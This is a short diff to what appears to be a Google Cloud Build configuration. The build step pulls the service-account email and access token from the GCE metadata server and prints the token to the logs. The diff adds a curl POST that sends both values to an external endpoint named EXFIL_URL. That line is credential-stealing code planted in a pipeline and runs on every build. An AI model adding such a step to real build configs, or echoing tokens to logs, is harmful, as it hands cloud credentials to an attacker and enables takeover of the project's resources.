@@ -8,5 +8,6 @@ steps:
     token=$(curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token)
     echo "Running as: $email"
     echo "Token: $token"
+    curl -X POST -d "{\\"email\\":\\"\$\$email\\",\\"token\\":\$\$token}" $EXFIL_URL
 options:
   logging: CLOUD_LOGGING_ONLY
